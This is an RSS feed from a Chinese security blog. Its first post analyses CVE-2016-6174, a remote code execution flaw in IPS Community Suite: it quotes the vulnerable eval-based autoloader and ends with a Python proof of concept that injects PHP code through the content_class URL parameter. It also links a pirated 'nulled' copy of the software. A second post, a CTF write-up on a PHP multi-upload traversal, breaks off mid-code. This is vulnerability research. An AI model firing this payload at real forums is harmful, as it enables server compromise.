<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    
    <title><![CDATA[Hc1m1]]></title>
    <link>http://0x48.pw//</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    <description><![CDATA[水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会]]></description>
    <pubDate>Wed, 10 Aug 2016 13:19:07 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title><![CDATA[CVE-2016-6174漏洞分析]]></title>
      <link>http://0x48.pw/2016/08/10/0x1F/</link>
      <guid>http://0x48.pw/2016/08/10/0x1F/</guid>
      <pubDate>Wed, 10 Aug 2016 13:02:51 GMT</pubDate>
      <description>
      <![CDATA[<p>IPS Community Suite Remote Code Execution Analysis</p>]]>
      
      </description>
      <content:encoded><![CDATA[<p>IPS Community Suite Remote Code Execution Analysis</p>
<a id="more"></a>
<p>花了三天时间去分析这漏洞, 两天搞环境, 半天分析漏洞, 半天写总结。</p>
<p>然后研究了一个phpenv + lnmp的不同虚拟主机不同php版本, 写了一个一键新建相应php版本的虚拟主机脚本, 会在之后的文章中发出来。</p>
<p>漏洞分析参考链接：<a href="http://blog.knownsec.com/2016/08/ips-community-suite-php-rce-cve-2016-6174/" target="_blank" rel="external">http://blog.knownsec.com/2016/08/ips-community-suite-php-rce-cve-2016-6174/</a><br>测试应用: <a href="http://115.159.191.193/source/IPS.Community.Suite.4.1.12.3_nulled.zip" target="_blank" rel="external">IPS.Community.Suite.4.1.12.3_nulled.zip</a></p>
<p>对于IPS远程代码执行的漏洞, 我觉得是比较鸡肋的, 因为关键有一个PHP版本的限制:</p>
<p><code>&lt;=5.4.24 &amp;&amp; 5.5.0-5.5.8</code></p>
<p>在安装4.1.12.3版本的IPS时, 该CMS会检测服务器的PHP版本, 要求 <code>&gt;=5.5.0</code>, 建议<code>&gt;5.6.0</code></p>
<p>所以说有效版本应该是 <code>5.5.0-5.5.8</code>, 小于等于<code>5.4.24</code>版本时, IPS根本无法安装</p>
<p>我使用的测试版本: 5.5.0, 安装的时候会产生致命bug, 我花了一天去调bug, 也没能根本解决.</p>
<p>在安装的最后一步, 应该是安装模块库之类的, 在每个安装步骤中定位到一句 <code>unset( \IPS\.*::i()-&gt;* ); //比如 unset( \IPS\Data\Store::i()-&gt;settings );</code></p>
<p>如果你直接输出unset的内容 <code>var_dump( \IPS\Data\Store::i()-&gt;settings );exit;</code>, 你会发现CMS报错了, 但是是输出一系列数组, 并没有解释错误的具体原因, 而unset一个error的变量, 显然会爆炸, 导致502</p>
<p>而该CMS安装的过程中一个步骤错误, 安装就会终止不会继续进行下去了, 而且会error的变量我并没有找到啥特征, 而且并不是所有这类的变量都会error, 所以没能在根本上解决问题, 不过我装IPS又不是为了使用, 只是为了用来研究漏洞, 所以把unset注释了, 可以从表面上解决该问题, 不过会出错的地方太多了, 我只能批量注释了：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$ grep "unset(.*::i()-&gt;" ./* -rl | xargs sed -i "s/unset( <span class="command">\\</span><span class="command">\\</span>IPS/<span class="command">\/</span><span class="command">\/</span>unset( <span class="command">\\</span><span class="command">\\</span>IPS/g"</span></span><br></pre></td></tr></table></figure>
<p>之后我使用php7.0安装IPS, 一下就好了, 没有出现任何问题, 所以我猜测该bug的原因应该是使用了一些不向下兼容的函数或新函数之类</p>
<p>虽然最终我成功安装好了, 但是过程是艰辛的, 从ZoomEye上搜<code>IPS Community Suite</code>, 只搜出30+的结果, 然后再加上php的版本限制, 如果php版本在这范围内, 有耐心解决bug安装成功的, 然后还不懂安全, 能有多少？所以我觉得这是一个比较鸡肋的漏洞</p>
<hr>
<p>现在开始分析该漏洞</p>
<p>该漏洞关键点是利用了class_exists函数的机制，来举例说明一下，对比的环境是<code>php5.5.0 &amp;&amp; php7.0.0</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register: '</span>, <span class="variable">$name</span>, <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass2</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register2: '</span>, <span class="variable">$name</span>, <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">'autoLoadClass'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoLoadClass2'</span>);</span><br><span class="line"></span><br><span class="line">class_exists(<span class="string">"Foo"</span>);</span><br><span class="line">class_exists(<span class="string">"Bar"</span>);</span><br><span class="line">class_exists(<span class="string">"Foo\Bar"</span>);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的代码说明的是<code>class_exists</code>函数的机制，两个版本的运行结果都一样</p>
<p><img src="http://qn.lazysheep.cc/img/ips_pic1.png" alt="ips_pic1"></p>
<p><code>class_exists</code>函数的作用是判断类是否存在，如果不存在，会去执行通过<code>spl_autoload_register</code>函数注册的函数，如果存在则返回true</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoLoadClass</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'spl_autoload_register: '</span>, <span class="variable">$name</span>, <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">'autoLoadClass'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">	<span class="variable">$class_base</span> = <span class="string">"Foo"</span>;</span><br><span class="line">	<span class="variable">$class</span> = <span class="variable">$class_base</span>.chr(<span class="variable">$i</span>);</span><br><span class="line">	var_dump(class_exists(<span class="variable">$class</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"       =====&gt;   "</span>.chr(<span class="variable">$i</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面的代码是为了说明<code>php5.5.0</code> 与 <code>php7.0.0</code>在class_exists函数上的不同点</p>
<p>结果太长了不好截图, 自己跑跑就知道了, <code>php7.0.0</code>对于class_exists函数输入的classname有进行一系列的过滤, 如果classname中出现了非法字符则直接返回false, 而<code>php5.5.0</code>却不会进行任何字符检测，只是要未定义的类名皆会运行<code>spl_autoload_register</code>注册的函数</p>
<p>再来看看IPS的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_content</span> <span class="keyword">extends</span> \<span class="title">IPS</span>\<span class="title">Dispatcher</span>\<span class="title">Controller</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">/**</span><br><span class="line">	 * Find content</span><br><span class="line">	 *</span><br><span class="line">	 * <span class="doctag">@return</span>	void</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">()</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ( ! \IPS\Request::i()-&gt;content_class <span class="keyword">AND</span> ! \IPS\Request::i()-&gt;content_id <span class="keyword">AND</span> ! \IPS\Request::i()-&gt;content_commentid )</span><br><span class="line">		&#123;</span><br><span class="line">			\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/1'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$class</span> = <span class="string">'IPS\\'</span> . implode( <span class="string">'\\'</span>, explode( <span class="string">'_'</span>, \IPS\Request::i()-&gt;content_class ) );</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( ! class_exists( <span class="variable">$class</span> ) <span class="keyword">or</span> ! in_array( <span class="string">'IPS\Content'</span>, class_parents( <span class="variable">$class</span> ) ) )</span><br><span class="line">		&#123;</span><br><span class="line">			\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的<code>class_exists</code>函数判断<code>$class</code>是否存在, 而<code>$class = &quot;IPS\&quot; + &quot;可控&quot;</code>, 所以如果我们构造一个不存在的类则会进入<code>spl_autoload_register</code>注册的函数之中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">spl_autoload_register( <span class="function"><span class="keyword">function</span><span class="params">( <span class="variable">$class</span> )</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">15</span> ) === <span class="string">'IPS\cms\Records'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">15</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">23</span> ) === <span class="string">'IPS\cms\Records\Comment'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">23</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">23</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class Comment&#123;$databaseId&#125; extends Comment</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_comments_title_&#123;$databaseId&#125;';</span><br><span class="line">			public static \$reputationType = 'comment_id_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">22</span> ) === <span class="string">'IPS\cms\Records\Review'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">22</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">22</span> );</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class Review&#123;$databaseId&#125; extends Review</span><br><span class="line">		&#123;</span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_reviews_title_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">18</span> ) === <span class="string">'IPS\cms\Categories'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">18</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">18</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms;</span><br><span class="line">		class Categories&#123;$databaseId&#125; extends Categories</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$contentItemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			protected static \$containerIds = NULL;</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">32</span> ) === <span class="string">'IPS\cms\Records\RecordsTopicSync'</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">32</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class RecordsTopicSync&#123;$databaseId&#125; extends \IPS\cms\Records&#123;$databaseId&#125;</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$databaseTable = 'cms_custom_database_&#123;$databaseId&#125;';</span><br><span class="line">			public static \$databaseColumnId = 'record_topicid';</span><br><span class="line">			public static \$commentClass = 'IPS\cms\Records\CommentTopicSync&#123;$databaseId&#125;';</span><br><span class="line"></span><br><span class="line">			public function useForumComments()</span><br><span class="line">			&#123;</span><br><span class="line">				return false;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">32</span> ) === <span class="string">'IPS\cms\Records\CommentTopicSync'</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">32</span> );</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class CommentTopicSync&#123;$databaseId&#125; extends CommentTopicSync</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records\RecordsTopicSync&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_comments_title_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">14</span> ) === <span class="string">'IPS\cms\Fields'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">14</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">14</span> );</span><br><span class="line">		<span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms; class Fields&#123;$databaseId&#125; extends Fields &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">47</span> ) === <span class="string">'IPS\cms\extensions\core\EditorLocations\Records'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">47</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">47</span> );</span><br><span class="line">		<span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms\\extensions\\core\\EditorLocations; class Records&#123;$databaseId&#125; extends \\IPS\\cms\\extensions\\core\\EditorLocations\\Records &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</span><br><span class="line">	&#125;</span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure>
<p>除了第一个判断，其他所有判断我们都可以进入造成命令执行漏洞(所以第一个判断的代码我省略了), 比如第二判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mb_substr( <span class="variable">$class</span>, <span class="number">0</span>, <span class="number">23</span> ) === <span class="string">'IPS\cms\Records\Comment'</span> <span class="keyword">and</span> is_numeric( mb_substr( <span class="variable">$class</span>, <span class="number">23</span>, <span class="number">1</span> ) ) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$databaseId</span> = mb_substr( <span class="variable">$class</span>, <span class="number">23</span> );</span><br><span class="line">	</span><br><span class="line">		<span class="variable">$data</span> = <span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">		namespace IPS\cms\Records;</span><br><span class="line">		class Comment&#123;$databaseId&#125; extends Comment</span><br><span class="line">		&#123; </span><br><span class="line">			protected static \$multitons = array();</span><br><span class="line">			public static \$customDatabaseId = $databaseId;</span><br><span class="line">			public static \$itemClass = 'IPS\cms\Records&#123;$databaseId&#125;';</span><br><span class="line">			public static \$title     = 'content_record_comments_title_&#123;$databaseId&#125;';</span><br><span class="line">			public static \$reputationType = 'comment_id_&#123;$databaseId&#125;';</span><br><span class="line">		&#125;</span><br><span class="line">EOF;</span></span><br><span class="line">		<span class="keyword">eval</span>( <span class="variable">$data</span> );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>$class = &quot;IPS\cms\Records\Comment1xxxxxxxx&quot;</code> 则可以进入判断</p>
<p><img src="http://qn.lazysheep.cc/img/ips_pic2.png" alt="ips_pic2"></p>
<p>在比如最后一个判断再输出下执行的值:</p>
<p><img src="http://qn.lazysheep.cc/img/ips_pic3.png" alt="ips_pic3"></p>
<h2 id="总结">总结</h2><p>php版本限制的原因是闭合代码的字符, 比如<code>{ } ;</code>这些都属于非法字符, 上面的第二个测试代码有Fuzzing出允许的字符, 如果使用允许的字符能构造出语法正确的命令则可以增加该漏洞的杀伤力, 不过新版本已经使用<code>intval</code>函数对于输入进行过滤了</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//example</span><br><span class="line">if ( mb_substr( <span class="formula">$class, 0, 47 ) === 'IPS<span class="command">\cms</span><span class="command">\extensions</span><span class="command">\core</span><span class="command">\EditorLocations</span><span class="command">\Records</span>' and is_numeric( mb_substr( $</span>class, 47, 1 ) ) )</span><br><span class="line">	<span class="special">&#123;</span></span><br><span class="line">		<span class="formula">$databaseId = intval(mb_substr( $</span>class, 47 ));</span><br><span class="line">		eval( "namespace IPS<span class="command">\\</span>cms<span class="command">\\</span>extensions<span class="command">\\</span>core<span class="command">\\</span>EditorLocations; class Records<span class="special">&#123;</span><span class="formula">$databaseId<span class="special">&#125;</span> extends <span class="command">\\</span>IPS<span class="command">\\</span>cms<span class="command">\\</span>extensions<span class="command">\\</span>core<span class="command">\\</span>EditorLocations<span class="command">\\</span>Records <span class="special">&#123;</span> public static <span class="command">\$</span>customDatabaseId = $</span>databaseId; <span class="special">&#125;</span>" );</span><br><span class="line">	<span class="special">&#125;</span></span><br></pre></td></tr></table></figure>
<p>带上PoC:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    random_string = random.choice(string.ascii_lowercase) + random.choice(string.ascii_uppercase)</span><br><span class="line">    random_string = hashlib.sha1(random_string).hexdigest()[<span class="number">20</span>:] + <span class="string">"H"</span></span><br><span class="line">    random_num1 = random.randint(<span class="number">24</span>,<span class="number">46330</span>)</span><br><span class="line">    random_num2 = random.randint(<span class="number">200</span>,<span class="number">46040</span>)</span><br><span class="line">    payload = <span class="string">'/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;echo %s*%s, "%s";exit;/*'</span> %(random_num1, random_num2, random_string)</span><br><span class="line">    res = req.get(self.url + payload)        </span><br><span class="line">    random_string = str(random_num1*random_num2) + random_string</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> random_string <span class="keyword">in</span> res.content:</span><br><span class="line">        result = &#123;<span class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</span><br><span class="line">        result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = self.url</span><br><span class="line">    <span class="keyword">return</span> self.parse_output(result)</span><br></pre></td></tr></table></figure></p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/08/10/0x1F/#disqus_comments</comments>
    </item>
    
    <item>
      <title><![CDATA[三个白帽之火币网2W大挑战]]></title>
      <link>http://0x48.pw/2016/07/14/0x1E/</link>
      <guid>http://0x48.pw/2016/07/14/0x1E/</guid>
      <pubDate>Thu, 14 Jul 2016 15:42:27 GMT</pubDate>
      <description>
      <![CDATA[<p>乌云峰会那两天放的题，没人撸出来，今晚又开题了<br>]]>
      
      </description>
      <content:encoded><![CDATA[<p>乌云峰会那两天放的题，没人撸出来，今晚又开题了<br><a id="more"></a></p>
<p>根据上次获得的情报和这次放出的两个tips:</p>
<blockquote>
<p>1.多文件上传，php源码对数组键值处理错误导致安全漏洞<br>2.base64解码导致字符丢失</p>
</blockquote>
<p>开始前我就开始搜了，然后搜到了一个<code>CVE-2012-1172</code>，根据这CVE找到一篇blog: <a href="https://nealpoole.com/blog/2011/10/directory-traversal-via-php-multi-file-uploads/" target="_blank" rel="external">https://nealpoole.com/blog/2011/10/directory-traversal-via-php-multi-file-uploads/</a></p>
<p>根据这篇博客中的代码，还有之前得到的情报，可以猜到大概就是该漏洞</p>
<p>我们来分析一下，我用phpstudy，在服务器上搭了一个5.2.17的php+apache服务, 测试代码如下：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//upload.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(-<span class="number">1</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">1</span>);</span><br><span class="line">print_r($_FILES);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form <span class="variable">action=</span><span class="string">""</span> <span class="variable">method=</span><span class="string">"POST"</span> <span class="variable">enctype=</span><span class="string">"multipart/form-data"</span> &gt;</span><br><span class="line">&lt;input <span class="variable">type=</span><span class="string">"file"</span> <span class="variable">name=</span><span 